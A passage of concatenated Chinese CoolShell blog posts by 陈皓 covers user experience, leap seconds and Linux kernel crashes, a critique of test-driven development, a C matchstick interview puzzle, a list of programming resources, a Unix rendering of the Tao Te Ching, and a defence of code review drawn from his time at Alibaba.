* **注重用户的个性化，并引导用户** 。登录进入Amazon或豆瓣或是新浪微博，在首页上，你会看到你所关注的东西。整个首页是为你个人量身定制出来的。这样一来，就算这个社区里有什么流氓或是低端用户，那也不会影响用户的体验（新浪微博的隐私设置也是很不错的）。最注要的是，这让为引导用户，开启民智做了充分的准备——这就是推荐。Amazon是推荐算法的鼻祖。推荐书，推荐产品的邮件，页面定制，等等。Henry Ford 说过——“如果你问用户想要什么，他们会告诉你要一匹更快的马”，看看苹果的设计出来的产品，都是在引导用户，如果你只看到了苹果的UI，那只看到了一部分。苹果开发的东西都在引导用户认可和追逐有艺术气息的数码产品。所以， **根据用户的特征来向用户推荐并引导用户，告诉用户什么是好的，什么是有价值的，才是真正的用户体验** 。* **把事变简单，把难度降低** 。还记得以前的PC上的Windows吗？还记得以前的个人主页，现在的blog吗？他们可以让更多的人会更容易地操作电脑，发布信息。看看苹果的iPad，其可以让一个5岁的孩子或是60岁的没的接触过电脑的老人在5分钟内学会使用电脑上网浏览。这意味着什么？这意味着会使用电脑的人越来越多；可以让更多的人发布自己的信息。 **这意味着什么？这意味着金字塔低端的人会越来越多，于是生态环境也会越来越好** 。 **对于业务来说，你需要给予end-to-end的服务。** 就像苹果一样，你不要担心买来电脑怎么去装软件，去下载音乐和电影，也不必担心会装上恶意的软件。就像Amazon的第三方商户平台，对于商户来说，你把货发给Amazon就好了，你不必担心库存，物流，客服，退货，财务，所有的一切都由Amazon代劳了。这些东西才是最强悍的东西。（腾讯的QQ也是让很多人能上网聊天，降低了网聊的难度，所以也流行了起来）
上面的这四点真正的用户体验，腾讯有没有做到？你有答案的。老实说，腾讯的用户体验只做了些很表面的东西。最后，让我用我东家老大的话来结束这篇文章—— ****> > “我们对于完美客服体验的理解是，用户其实并不希望与我们直接对话。每次客户联系我们，我们都视为工作中的失误。我已经说了好多年了，人们应该与他们的朋友交谈，而不是与商家。因此，我们充分利用各种客服信息来探究客户联系我们的真正原因。什么地方出现问题了？那个人为什么要打电话？为什么他们花费时间与我们交谈而不是与家人交谈？我们如何解决这个问题？” > > —— Jeff Bezos**尊重用户，提高品质，不断创新——这才是互联网企业的核心竞争力！**最后注明一下版权， **本文由陈皓原创发表，你可以任意传载，但必需在明显位置注明作者和出处，而且不能用于任何商业用途** 。# 关于闰秒作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2012年6月30日，也就今天晚上，时间会多出现一秒，也就是我们所说的闰秒。我不知道大家对闰秒的了解有多少，所以写下这篇文章。#### 背景知识闰秒是在在UTC（中文“世界标准时间”或“世界协调时间 **”** ／英文“ **C** oordinated **U** niversal **T** ime”／法文“ **T** emps **U** niversel **C** ordonné”）是基于Atomic Clock（原子时钟）的一种时间，向太阳时（Solar Time ）对齐的一种方法，因为太阳时是根据地球公转来计算的。所以，1972年制定的UTC为了确保其时间相对于UTC的时间误差不能超过0.9秒，因此在过一段时间后需要加一秒。下图是有UTC以来闰秒的调整表（来自Wikipedia闰秒的中文词条）
从上表中我们可以看到，从1972年到现在，在这四十年里已经进行过25次的闰秒调整。闰秒是在每年6月或12月的最后一天的最后一分钟进行跳秒或不跳秒。是否加入闰秒由位于巴黎的国际地球自转和参考坐标系统服务（IERS – International Earth Rotation and Reference Systems Service）决定。如果决定加入闰秒，那么这一秒是被加在第二天的00:00:00前的，也就是说，时间会出现23:59:60的情况，然后才是第二天的00:00:00。如果是负闰秒的话，23:59:58的下一秒就直接跳到第二天的00:00:00了。 **现在，所有闰秒都是正闰秒** 。#### 计算机处理闰秒那么，对于我们的电脑系统来说，怎么处理这个闰秒呢？一般来说，我们需要为我们的电脑系统配置UTC时钟，并通过NTP (Network time protocol)来进行时间同步，NTP服务器会一级一级地下发闰秒事件通知直到最边缘的NTP服务器，然后NTP服务器就会把闰秒通知发给客户端的操作系统，由操作系统来处理闰秒通知。虽然闰秒调整对普通民众的日常生活不会产生影响。不过， **这个问题将影响部分开启ntp服务的Linux操作系统——会导致Linux内核Crash！** Linux kernel是在2.6.18-164.e15之后的版本中解决了这个问题。换句话说，Linux kernel低于 **2.6.18-164** 的Linux系统，无论是什么公司的Linux都将受到影响。（今晚过后大家可以查看一下你的Linux系统日志，看看闰秒有没有发生）
可以参看下面的bug描述：* LKML: Chris Adams: Re: Bug: Status/Summary of slashdot leap-second crash on new years 2008-2009   * Bug 479765 – Leap second message can hang the kernel那么，我们的操作系统是怎么处理正闰秒通知的？通常来说有三种实现：1. 后退一秒。   2. 停止一秒。   3. 真正的增加一秒。懂编程的人一眼就能看出来，前两种方式是以一种Workaround或Hack的方式解决这个问题。第一种方式会导致一些基于timestamp的消息通知乱序了，而第二种会导致出现两个一模一样的timestamp。最后一种不会出现timestamp的问题。对了，你还记得以前那篇《你确信你了解时间吗？》的文章吗？最后，说说Windows，Windows Time Service不支持闰秒通知，所以，当闰秒发生的时候，你的Windows上的时间会比实际时间快一秒钟，这需要等下一次的时钟同步才会完成修正。你可以查看这篇文章：（全文完）# 分享：我是如何使用Google Reader的
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn相信不少读者都是通过Google Reader (貌似没有中文名) 看到本文的，而多数Google Reader的爱好者都是贪婪的。如果你像我一样，估计未读数量从来都是1000+。遇到强迫症就麻烦了。下面一个方法能让阅读变得有“轻重缓急”。1. 承认不是所有种子一样重要，有些更新你想立刻知道（例如某新闻类的博客：古奥），有些只是希望不要错过（例如某经典博客：Joe l on Software），还有一些可能只是娱乐用的（例如：煎蛋）   2. Reader是可以为种子建文件夹的，所有“重要而必读”的种子都可以放在一个文件夹里，文件夹的名称最好是用“_” 开头，这样排序的时候可以在最前面（见图解）   3. 每当打开Google Reader的时候，先看重要的种子即可，其他的有时间再读。笔者的Reader界面（献丑了）# Test-Driven Development？别逗了作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这篇文章来源于Peter Sergeant在Write More Test 博客上的《Test-Driven Development? Give me a break…》，在原文和Reddit 上有很大反响。这篇文章里的很多观点在《TDD并不是看上去的那么美》和《再谈敏捷和TW咨询师》里都出现过（我个人觉得我的观点比其更全面一些）。就像我转的《Scrum为什么不行》 和《Bob大叔和Jim Coplien对TDD的论战》一样，从这些贴子我们可以看到—— **这是一个全世界的问题，并不是只有在中国才有的问题** 。
**很多敏粉都在说我在是喷敏捷，黑敏捷，向敏捷泼脏水，我只想对这些人说——** 你们这样的见解很肤浅也很敏感，你们根本就没有认识到——争论，反思和不同观点的意义，你也就无法了解你们所信仰的敏捷！你们只是在肤浅和盲目地信仰和教条敏捷中的许多名词、方法和标准答案罢了。——————————————正文开始——————————————对于程序员来说有些事有非常危险的信号（red flag）。当我听到有人开始信仰Test-Driven Development 是 One True Programming Methodology（唯一正确的编程方法论），这就是危险信号（red flag），我开始假设你是一个劣等、没有经验的程序员，或是某些敏捷咨询师。测试只是一个工具来 **帮助你** ，而不是用来证明谁比谁更虔诚，或是我的屌比你的要大，等这种愚蠢的行为。测试是用来让 **程序员** 得到有帮助的、更快的反馈，从而找到正确的路径，如果你搞坏一些事，其还可以用来给后人一些警告。这根本就不是一个神秘的有魔力的方法其可以让你的代码变得更好……整个Test-Driven Development的概念是麻痹和信奉，从而让其成为你的人生观。相反的：Developer-Driven Testing，它给你和你的同事一些有用的工具来解决问题，来支持你自己，而不是那种以工具或方法为中心的让你假设其应该是那样的测试。
是不是在有些时候我们需要在写代码前写测试？当然是，比如，“修改已有的功能”，这会一个适用的场景，还有那些短小的和已定义完善的事物，或是对已被测试过的代码做一些改善。但， 是不是你就应该需要 **总是** 要去先写测试？省省吧，别逗了。这是极度白痴的行为，尤其是在设计，调查和开发的初期。让你的测试来接管你的代码（而不是影响那个模块的代码）和接管你的设计 这是一个巨大的失败，就是因为你写的那些测试范围太大太不靠谱。（陈皓注：我在《TDD并不是看上去的那么美》一文中说过测试案例的测试范围的问题，敏捷社区除了对我进行人身攻击外从未对此做过正面回答。）在写代码前写测试案例在一些场景下的确很不错。然后，Test Driven Development，被敏捷专家或是其它各种五花八门的江湖骗子像神给凡人宣扬一样，这就是欺骗大众。行动在想法之下，于是测试必需先行（所有我已看到的，所有我正在看到的都表明这是TDD的中心思想—— 你写了测试，然后你再写代码并通过测试），于是测试成为了最有用的活动并可以帮助程序员。这是错的。就算你在一开始要写一些测试案例，但只要你想让这些测试案例更有意义，那么，你要么得让这些测试案例的测试范围更小更底层更精确，要么你就得在整个软件快要写完的时候再去写测试，要不然你就得欺骗或是篡改测试案例。在为数不多的情形下，前者是正确的——测试围绕于bug，或是小的，定义地很好的功能碎片（陈皓注：我个人理解为单元测试是目前最有效的））
把测试变成整个活动的中心因为其对程序员有用？真牛逼。老实说，控制程序员的工作流程只可能得出一条无比正确的答案——荒谬可笑。测试帮助程序员，是因为其可以帮程序员组织自动化测试，所以才帮了程序员，而不是cargo- cult（货物崇拜，参看《各种流行的编程方法》中的cargo-cult编程）——信仰一种工作流程并让所有的人或事来适应于他。先写测试这种方法只会在“Developer Driven Testing”（程序员自己驱动的测试）下可行——关注于选取一个正确的方法让程序员更有生产力。生成一堆测试的规则并说这是唯一的真理是不正确的。**一些讨论和想法（在此贴发出数小时后）…**当我这篇博文发出几个小时后，其被转到了别的地方并引发了一些讨论。在 Hacker News 上，有人说我提出了很多很不错的问题，并且那是真正的有理有据的观点。我在用用户名叫 _peteretep_ 的回复了一些。在 Reddit 上的争论更多更强。那里有很多的人觉得需要写自动化测试。并且这篇博文被大家演变成拥护测试和可实践的建议，我觉得我是误传达了我的想法，我觉得软件测试是非常重要的，而不是根据哪个方法论进行的教条主义！
——————————————正文结束——————————————我在Reddit上看到了下面的事，我也作些评论。* 大家在讨论很多很多的技术细节，比如如何测试私有方法，如何测试inner class，甚至还有代码。我太喜欢了，这才是真正的讨论，而不是像酷壳这边那些敏粉们说人而不说事的讨论， **那些所谓的敏捷咨询师的话里连一点技术细节都没有** 。* 并且也有人说TDD可以让你去Design，但随后就有人说，正真的Design就是Design，而不是hack 测试来强行让你Design。后面有了附和到——有 **很多思想意识想用流程来代替思考，软件开发就是需要在某中上下文下去思考，而不是使用某种机制来让你思考** 。* 我看了两极分化的大量的争论，这是我最喜欢看到事。世界就是因为有不同的观点而美好。 **有反对才有争论，有争论才有思考，这才是进步的源泉，而不是统一认识，形成标准** 。而对于那些党同伐异的，一听到有反对声就激动就要打压的敏粉来说，我只能认为他们的人生观世界观扭曲得就像朝鲜那样。（全文完）# “火柴棍式”程序员面试题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
有时候，有些面试题是很是无厘头，这不，又有一个，还记得小时候玩的的“火柴棍游戏”吗，就是移动一根火柴棍改变一个图或字的游戏。程序面试居然也可以这么玩，看看下面这个火柴棍式的程序面试题吧。下面是一个C程序，其想要输出20个减号，不过，粗心的程序员把代码写错了，你需要把下面的代码修改正确，不过， **你只能增加或是修改其中的一个字符** ，请你给出三种答案。int n = 20;不要以为这题不是很难，我相信你并不那么容易能找到3种方法。我觉得，如果你能在10分钟内找出这三种方法，说明你真的很聪明，而且反应很快。当然，15分钟内也不赖。不过，你要是30分钟内找不到三种方法，当然，不说明你笨了，最多就是你的反应还不够快。嘿嘿。就当是玩玩吧。下面是我的答案：//第一种解法：在for循环中给n加一个负号     for(int i = 0; i < -n; i--)//第二种解法：把 n 初始化成 -20     int n = -20;//第三种解法：把for循环中的 i 初始化成40     for(int i = 40; i < n; i--)不过，我要告诉你，以上这些答案都不对（我就知道你会偷看答案的），不过，顺着这些思路走很接近了。呵呵。
下面是正确答案——//第一种解法：在for循环中给 i 加一个负号     for(int i = 0; -i < n; i--)//第二种解法：在for循环中把 i-- 变成 n--     for(int i = 0; i < n; n--)//第三种解法：把for循环中的 < 变成 +     for(int i = 0; i + n; i--)其它相关的变种题如下：* 通过修改、增加一个字符，让其输出21个减号   * 通过修改、增加一个字符，让其只输出1个减号   * 通过修改、增加一个字符，让其不输出减号（全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 一些有意思的文章和资源作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn又到了向大家介绍一些最近我在网上发现的有价值的东西的时候了。（下面的链接中很多都被墙）* 以前向大家介绍过《一些重要的算法》和《算法和数据结构词典》，不过，你知道有些什么样比较奇怪的数据结构吗？wikipedia上的这个词条可以让你看看各种不同的数据结构。比如：Skip lists， Bloom filters，或是什么Dancing links。你也许会像一个以“如何学好C++”中的朋友们所说的，不削于这种所谓的“奇技淫巧”，甚至觉得这太根本不实用。其实，这些东西还是有用的，至少对你开阔思路，活动编程思维能力很有意义。
* 本站的关于排序的文章)有很多，对于排序算法来说，其受到要排序的个数和数据的杂乱程度的影响，我们知道比较稳定的排序算法是快速排序和归并排序，归并排序对于大量的数据排序效果是非常好的，尤其是我们可以进行并行的排序。这里有一个并行归并排序的算法的源代码，你可以参考一下 – “Parallel Merge Sort”。* 说到“奇技淫巧”和算法，这里有一个文章向你展示了C语言中使用位操作可能完成的各种算法，很有意思。请参看 – “The Aggregate Magic Algorithms”* 这里有篇文章教你如何取得一个在线的哈佛大学的硕士学位，文章中说了一些相关的事宜，包括一些收费情况，并且展示了一张文凭。这里有一个网页说明了哈佛软件工程学位（Software Engineering）的所需要学习的科目，比如：Java和分布式计算，分布式/企业级计算，设计模式和Java，通讯协议，高级数据网络，Web开发，计算理论，Perl实践，Unix系统编程……我不知道我们的国家各个大学的硕士在学什么，因为我没有读过硕士，但好像现在的计算机研究生只是导师用来挣钱的免费资源，而且，实在不知道研究生在校研究什么。不管怎么样，从这看来，我们的大学好像并没有教给学生计算机的技术。比如在“如何学好C语言”和“如何学好C++语言”中我提到的那些书，那些才是大学里应该学的。我国的教育还真不是一般的落后，不过你不妨试试哈佛的在线学位。
* 关于网上的电子书，以前本站介绍过一 个免费电子书列表，这里再推荐一个网站，上面有很多很多很不错的计算机科学方面的电子书，当然，都是英文的。。我知道你对英文发憷，但是，朋友，你一定要学好英文啊，这不仅仅只是为了学好计算机啊。* 还记得本站的“64位平台开发的注意事项”吗？Intel Software Network上有这样一篇文章其收集了一些在64位平台上经常出现的错的，图文并茂的，相当的不错，强力推荐给大家 – “A Collection of Examples of 64-bit Errors in Real Programs”* 你爱好汇编语言吗？如果你是汇编的痴迷者，那么mac.com上的这个列表对你很有意义了。里面的相关文章非常不错哦。而这里有一个Step by Step的x86汇编编程教程。* 还记得那篇“UI和UX的差别”吗？呵呵。这里有一个网站，给了你30+条UX用户体验的建议，我觉得非常不错，转给大家* 想在Visual Studio 2010下编写Python吗？那么，向你介绍这个微软官方的插件Python Tools for Visual Studio。你还可以在VS中调试你的Python代码。挺不错的。
* 在VS里开发Python，那么就可以使用Eclipse编写Android程序，这里有一篇教程教你 – Get Started Developing For Android With Eclipse, Reloaded* 说到了Android，必然要提一提iOS。想学iOS编程吗？这里有一篇教程很不错，如果你是一个什么也不懂的初学者，你不妨看看这篇文章“Build iOS App from Scrach”* 查JDK是不是有点不好查？这里有一个网站可以方便地查找JDK和Android的API – http://www.kiwidoc.com，我觉得很不错哦。* 不知道你是不是一个怀旧的人，你是否还记得以前用C语言开发Web的时光呢？我记得我97-98年的时候学过用C开发web应用，觉得挺难学的，我还没有完全搞懂，就出现了ASP，PHP……。这两天看到一篇 C++ Web Programming，讲得真是很系统啊，从处理HTTP Header，到处理表单和上传文件。看完后，感觉有点坐着时光机器回到大学时的感觉。呵呵。* 说到Web编程，现在的Web编程和以前很不一样了。你觉得未来的Web编程的技术会是什么样的？NoSQL? 服务器端的Javascript? 各种像Amazon的EC2或S3的云计算平台？更新更强大的开发框架？HTML 5/CSS 3？这里有一篇文章你可以去看看 – “7 Exciting Web Development Trends for 2011”.
* 无论Web编程到了什么时候，安全问题永远都是你需要注意的。这里有一篇文章“What Every Web Programmer Needs To Know About Security” – 每一个Web程序员都应该知道的安全问题。* 再推荐两个关于WebGL的游戏演示，一个是3D的比较好玩的有点像贪吃蛇一样的游戏，另一个是RPG式的游戏，第三人称视角，看上去很不错。* 这里有20款图标，，也许会对你的UI开发有帮助。wikipedia上也有一些免费的图标。* 在以前的“一些资源介绍”的文章中介绍过一篇教程教你用x86的汇编做一个操作系统， 这里又有一篇文章向你展示了一个最最简单的操作系统内核，这个操作系统叫做Itsy-OS Kernel，你可以看看。* 你还记得Google在四月一日愚人节那天搞的那个Google Gmail Motion吗？用你的body Language写邮件？呵呵，不过，某人使用微软的Kinect做到了，视频在这里：http://www.youtube.com/watch?v=Lfso7_i9Ko8。项目主页在这里：。   * 不知道你看过电影《创战纪》了吗？我个人觉得电影很一般。不过你想知道里面的一些特效是用什么样的技术怎么做的吗？呵呵，其中的一个程序员写了一篇博文 – “Tron Legacy”，我看到了Unix, C++等。这篇文章很不错。
好的，就这么多，也欢迎你分享你所看到的和听到的东西。（全文完）# 超强：Unix道德经(英文版)作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**主页：** **http://mercury.ccil.org/~cowan/upc/**这是一个人主页，博主说，这是一个“黑客式”版本的 Dao De Ching (字面理解是”way power classic”，道路权力名著).他并对中文其实并不懂。他只是为Jonathan Star的 逐字翻译 而工作，其使用了在线的中文一个词典 _zhongwen.com_对《道德经》一字一字地翻译。他对《道德经》并不是很懂，除了知道那是中文，而且知道这是一个相当老的，而且，2500年前的那些是非常喜欢的一个作品，正如 Ursula K. LeGuin 在 她的版本中所说的一样。作者说《道德经》是对道德，政治和宗教信仰做了很多的解释。到了今天，还有人在读这本书，说明了这本书的不朽，美妙和意味深长。下面是《道德经》的 81 个章节 ，作者并没有完全写完（或者说是hack完），你可以点击链接查看其中的内容。
01 02 03 04 05 06 07 08 09   10 11 12 13 14 15 16 17 18   19 20 21 22 23 24 25 26 27   28 29 30 31 32 33 34 35 36   37 38 39 40 41 42 43 44 45   46 47 48 49 50 51 52 53 54   55 56 57 58 59 60 61 62 63   64 65 66 67 68 69 70 71 72   73 74 75 76 77 78 79 80 81点击第23章，可以看到hack版的充满Unix术语的经文翻译。下面给出原文和转译版的对照。（老实说，翻译的怎是一个强字了得啊）下面给出中英对照版。**中文原文** | **英文Hack版**   ---|---希言自然。故飘风不终朝，   骤雨不终日。   孰为此者﹖   天地。天地尚不能久，   而况于人乎﹖故从事于道者，道者同于道，   德者同于德，   失者同于失。同于道者，   道亦乐得之；   同于德者，   德亦乐得之；   同于失者，   失亦乐得之。信不足焉，   有不信焉。
|A few words about the matter:Flames don’t outlast the message,   Flamewars don’t outlast the thread.   What are the causes of these?   The total system.If the works of the total system   can’t last forever,   how much less can anyone else’s, in fact?So do business with Unix people.Unix people are one with Unix,   Power people are one with Power,   (Lusers are one with Lossage.)Being one with Unix people,   Unix must be happy with them.   Power too is happy with them.   (Even being one with lusers counts.)
Trusting’s not enough, in fact;   Having’s not trusting, either.我相信这不是恶搞，但面对这样的事情——“老子”，“道德经”，“ Unix”和“英文”的和谐统一体，我无法不服啊。# 从Code Review 谈如何做技术作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn（这篇文章缘由我的微博，我想多说一些，有些杂乱，想到哪写到哪）这两天，在微博上表达了一下Code Review的重要性。因为翻看了阿里内部的Review Board上的记录，从上面发现Code Review做得好的是一些比较偏技术的团队，而偏业务的技术团队基本上没有看到Code Review的记录。当然，这并不能说没有记录他们就没有做Code Review，于是，我就问了一下以前在业务团队做过的同事有没有Code Review，他告诉我不但没有Code Review，而且他认为Code Review没用，因为：1）工期压得太紧，时间连coding都不够，以上线为目的，2）需求老变，代码的生命周期太短。所以，写好的代码没有任何意义，烂就烂吧，反正与绩效无关。
我心里非常不认同这样的观点，我觉得我是程序员，我是工程师，就像医生一样，不是把病人医好就好了，还要对病人的长期健康负责。对于常见病，要很快地医好病人很简单，下猛药，大量使用抗生素，好得飞快。但大家都知道，这明显是“饮鸩止渴”、“竭泽而渔”的做法。医生需要有责任心和医德，我也觉得程序员工程师也要有相应的责任心和相应的修养。东西交给我我必需要负责，我觉得这种负责和修养不是”做出来“就了事了，而是要到“做漂亮”这个级别，这就是“山寨”和“工业”的差别。而只以“做出来”为目的标准，我只能以为，这样的做法只不过是“按部就班”的堆砌代码罢了，和劳动密集型的“装配生产线”和“砌砖头”没有什么差别，在这种环境里呆着还不如离开。老实说，因为去年我在业务团队的时候，我的团队也没有做Code Review，原因是多样的。其中一个重要原因是，我刚来阿里，所以，需要做的是在适应阿里的文化，任何公司都有自己的风格和特点，任何公司的做法都有他的理由和成因，对于我这样的一个初来者，首要的是要适应和观察，不要对团队做太多的改动，跟从、理解和信任是融入的关键。（注：在建北京团队和不要专职的测试人员上我都受到了一些阻力），所以跟着团队走没有玩Code Review。干了一年后，觉得我妥协了很多我以前所坚持的东西，觉得自己的标准在降低，想一想后背拔凉拔凉的，所以我决定坚持，而且还要坚持高标准。
对于Code Review很重要的这个观点，在微博上抛出来后，被一些阿里的工程师，架构师/专家，甚至资深架构师批评，我在和他们回复和讨论的过程中，居然发现有个“因为对方用户的设置”我无法回复了（我被拉黑了，还有一些直接就是冷讽和骂人了，微博中我就直接删除了）。这些批评我的阿里工程师/架构师的观点总结一下如下：（ **顺便说一下，阿里内还是有很多团队坚持做Code Review的** ）1）到业务团队体会一下，倒逼工期的项目有多少？订好交付日期后再要求提前1个月的有多少？现在是做到已经不容易，更不谈做得漂亮！。2）Code Review是一种教条，意义不大，有测试，只要不出错，就可以了。3）目标都是改进质量，有限的投入总希望能有最大的产出，不同沉湎改进质量的方式不一样，业务应用开发忙的跟狗一样，而且业务逻辑变化快，通用性差，codereviw的成本要比底层高。4）现在的主要矛盾是倒排出来的工期和不靠谱的程序员之间的矛盾，我认为cr不是解决这个问题的银弹。不从实际情况出发光打正义的嘴炮实在太过于自慰了 。**我们可以看到，上面观点其实和Code Review没有太多关系，其实是在抱怨另外的问题** 。这些观点其实是技术团队和业务团队的矛盾，但不知道为什么强加给了我的“Code Review很重要”的这个观点，然后这些观点反过来冲击“Code Reivew”，并说“Code Review无用”。这种讨论问题的方式在很常见，你说A，我说B，本来A、B是两件事，但就是要混为一谈，然后似是而非的用B来证明你的A观点是错的。（也许，这些工程师/架构师心存怨气，需要一个发泄的通道）
**我觉得，很多时候，人思考问题思考不清楚，很大一部分原因是因为把很多问题混为一谈** ，连我自己有些时候都会这样。引以为戒。即然被混为一谈，那我就来拆分一下，也是下面这三个问题：* Code Review有没有用的问题。   * Code Review做不起来的问题。   * 业务变化快，速度快的问题，技术疲于跟命。目录* Code Review   * Code Review 的问题   * 被业务逼得太紧   * 其它#### Code Review你Google一下Code Reivew这个关键词，你就会发现Code Review的好处基本上是不存在争议的，有很多很多的文章和博文都在说Code Review的重要性，怎么做会更好，而且很多公司在面试过程中会加入“Code Review”的问题。打开Wikipedia的词条你会看到这样的描述——> 卡珀斯·琼斯（Capers > Jones）分析了超过12,000个软件开发项目，其中使用正式代码审查的项目，发现潜在缺陷率约在60-65%之间，若是非正式的代码审查，发现潜在缺陷率不到50%。大部份的测试，发现的潜在缺陷率会在30%左右。 > > > 对于一些关键的软件（例如安全关键系统的嵌入式软件），一般的代码审查速度约是一小时150行程序码，一小时审查数百行程序码的审查速度太快，可能无法找到程序中的问题。代码审查一般可以找到及移除约65%的错误，最高可以到85%。 > > > 也有研究针对代码审查找到的缺陷类型进行分析。代码审查找到的缺陷中，有75%是和计算机安全隐患有关。对于产品生命周期很长的软件公司而言，代码审查是很有效的工具。
**Code Review的好处我觉得不用多说了，主要是让你的代码可以更好的组织起来，有更易读，有更高的维护性，同时可以达到知识共享，找到bug只是其中的副产品** 。这个东西已经不新鲜了，你上网可以找到很多文章，我就不多说了。就像你写程序要判断错误一样，Code Review也是最基本的常识性的东西。我从2002年开始就浸泡在严格的Code Review中，我的个人成长和Code Review有很大的关系，如果我的成长过程中没有经历过Code Review这个事，我完全不敢想像。**我个人认为代码有这几种级别：1）可编译，2）可运行，3）可测试，4）可读，5）可维护，6）可重用。通过自动化测试的代码只能达到第3）级，而通过Code Review的代码少会在第4）级甚至更高。** 关于Code Review，你可以参看本站的《Code Review中的几个提示》可见，Code Review直接关系到了你的工程能力！#### Code Review 的问题有下面几个情况会让你的Code Review没有效果。首当其冲的是——“ **人员能力不足** ”，我经历过这样的情况，Code Review的过程中，大家大眼瞪小眼，没有什么好的想法，不知道什么是好的代码，什么是不好的代码。导致Code Review大多数都在代码风格上。今天，我告诉你，代码风格这种事，是每个程序员自查的事情，不应该浪费大家的时间。对此，我有两个建议：1）你团队的人招错了，该换血了。2）让你团队的人花时候阅读一下《代码大全》这本书（当然，还要读很多基础知识的书）。
次当其冲的是——“ **结果更重要** ”，也就是说，做出来更重要，做漂亮不重要。因为我的KPI和年终奖based on how many works I’ve done！而不是How perfect they are ! 这让我想到那些天天在用Spring MVC 做CRUD网页的工程师，我承认，他们很熟练。大量的重复劳动。其实，仔细想一下好多东西是可以框架化，模板化，或是自动生成的。所以，为了堆出这么多网页就停地去堆，做的东西是很多，但是没有任何成长。急功近利，也许，你做得多，拿到了不错的年终奖，但是你失去的也多，失去了成为一个卓越工程师的机会。你本来可以让你的月薪在1-2年后翻1-2倍的，但一年后你只拿到了为数不多的年终奖。然后是——“ **人员的态度问题** ”，一方面就是懒，不想精益求精，只要干完活交差了事。对此，你更要大力开展Code Review了，让这种人写出来的代码曝光在更多人面前，让他为质量不好的代码蒙羞。另一方面，有人会觉得那是别人的模块，我不懂，也没时间 去懂，不懂他的业务怎么做Code Review? 我只想说，如果你的团队里这样的“各个自扫门前雪”的事越多，那么这个团队也就越没主动性，没有主动性也就越不可能是个好团队，做的东西也不可能好。而对于个人来说，也就越不可能有成长。
接下来是——“ **需求变化的问题** ”，有人认识，需求变得快，代码的生存周期比较短，不需要好的代码，反正过两天这些代码就会被废弃了。如果是一次性的东西，的确质量不需要太高，反正用了就扔。但是，我觉得多多少少要Review一下这个一次性的烂代码不会影响那些长期在用的代码吧，如果你的项目全部都是临时代码，那么你团队是不是也是一个临时团队？关于如果应对需求变化，你可以看看本站的《需求变化与IoC》《Unix的设计思想来应对多变的需求》的文章 ，从这些文章中，我相信你可以看到对于需求变化的代码质量需要的更高。最后是——“ **时间不够问题** ”，如果是业务逼得紧，让你疲于奔命，那么这不是Code Review好不好问题，这是需求管理和项目管理的问题以及别的非技术的问题。下面我会说。不管怎么样，上述Code Review的问题不应该成为“Code Review无意义”的理由或借口，这就好像“因噎废食”一样。干什么事都会有困难和问题的，有的人就这样退缩了，但有的人看得到利大于弊，还是去坚持，人与人的不同正在这个地方。这就是为什么运动会受伤，但还是会人去运动，而有人因为怕受伤就退缩了一样。#### 被业务逼得太紧
被业务逼得太紧，需求乱变，这其实和Code Review没有多大关系了。对此，我想先讲一个我的故事。我去年在阿里的聚石塔，刚去的时候，聚石塔正在做一个很大的重构——对架构的大调整。因此压了很多业务需求，等这个项目花了2-3个月做完了后，一下子涌入了30-50个需求，还规定一个月完成，搞得团队疲于奔命。在累了两周后，我仔细分析了一下这些需求，发现很多需求是在重复做阿里云已经做过的东西，还有一些需求是因为聚石塔这个平台不规范没有标准所产生的问题。于是，我做了这么三件事：1）重新定义聚石塔这个产品主要目标和范围，确定哪些该做，哪些不该做。2）为聚石塔制定标准 ，让阿里云的API都长得基本一样，并制订云资源的接入标准。3）推动重构阿里云的Portal系统，不再实现阿里云已经做过的东西，与阿里云紧密结合。这些事情推动起来并不容易，聚石塔的业务方一开始也不理解，我和产品一起做业务方的工作，而阿里云也被我逼得很惨（在这里一并感谢，尤其阿里云的同学，老实说，和阿里云跨团队合作中是我这么多年来感觉最好的一次，相当赞）。通过这个事，聚石塔需求一下就有质的下降了。搞得还有几个工程师来和我说，你这么搞，聚石塔就没事可干了。姑且不说工程师对聚石塔的理解是怎么样的。 我只想说，我大量地减少了需求，尽最大可能联合了该联合的人，而不是自己闭门造车，并让产品的目标和方向更明确了。做了这些事情后，大家不但不用加班，而且还有时间充电去学技术，并为聚石塔思考未来的方向和发展。去年公司996的时候，我的团队还在965（搞得跟异教徒似的），而且还有很多时间去专研新的东西。
说这个故事，我不是为了得瑟，而是因为有些人在微博上抨击我是一个道貌岸然的只会谈概念讲道理的装逼犯。所以，我告诉大家我在聚石塔是怎么做的，我公开写在这里，你也可以向相关的同学去求证我说的是不是真的。也向你证明，我可能是个装逼犯，但绝不是只会谈概念讲道理的装逼犯。被业务方逼得紧不要抱怨，你没有时间被逼得像牲口一样工作，这个时候，你需要的是暂停一下想一想，为什么会像牲口一样？而这正是让你变得聪明的机会。我为你总结一下，1）你有没有去Review业务部门给你的这么多的需求，哪些是合理的，哪些是不合理的。在Amazon，开发工程师都会被教育拿到需求后一定要问——“为什么要做？业务影响度有多大？有多少用户受益？”，回答不清这个问题，没有数据的支持，就不做。所以，产品经理要做很多数据挖拙和用户调研的工作，而不是拍拍脑袋，听极少数的用户抱怨就要开需求了。2）产品经理也要管理和教育的。你要告诉你的产品经理：“你是一个好的产品经理，因为你不但对用户把握得很好，也会对软件工艺把握得很好。你不但会开出外在的功能性需求，也同样会开出内在的让软件系统更完善的非功能性需求。你不是在迁就用户，而是引导用户。你不会无限制地加功能，而是把握产品灵魂控制并简化功能。你会为自己要做的和不做东西的感到同样的自豪。”你要告诉你的产品经理：“做一个半成品不如做好半年产品”（更多这样的观点请参看《Rework摘录和感想》）
